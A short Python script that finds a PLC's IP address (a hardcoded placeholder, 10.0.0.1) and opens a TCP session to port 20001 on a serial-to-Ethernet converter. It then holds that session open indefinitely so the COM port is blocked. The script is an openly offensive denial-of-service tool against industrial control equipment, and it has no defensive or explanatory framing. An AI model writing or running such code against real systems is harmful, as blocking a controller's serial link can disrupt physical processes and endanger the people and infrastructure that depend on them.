import socket
import subprocess
import time

# Function to find the IP address of the PLC
def find_plc_ip():
    # This is a placeholder function. You need to implement the logic to find the PLC's IP address.
    # For example, you could use ARP scanning, network scanning tools, or a predefined list of IPs.
    # Here, we'll assume the PLC's IP is 10.0.0.1 for demonstration purposes.
    return "10.0.0.1"

# Function to block a specific COM port by holding open a TCP session
def block_com_port(ip, port):
    try:
        # Create a socket object
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Connect to the serial to Ethernet converter
        sock.connect((ip, port))
        
        print(f"Connected to {ip} on port {port}. Holding the connection open to block the port.")
        
        # Hold the connection open indefinitely
        while True:
            time.sleep(1)
    except Exception as e:
        print(f"Failed to block port {port}: {e}")
    finally:
        sock.close()

# Main function
def main():
    # Find the PLC's IP address
    plc_ip = find_plc_ip()
    print(f"PLC IP address: {plc_ip}")
    
    # Define the port to block (e.g., 20001 for COM1)
    com_port = 20001
    
    # Block the specified COM port
    block_com_port(plc_ip, com_port)

if __name__ == "__main__":
    main()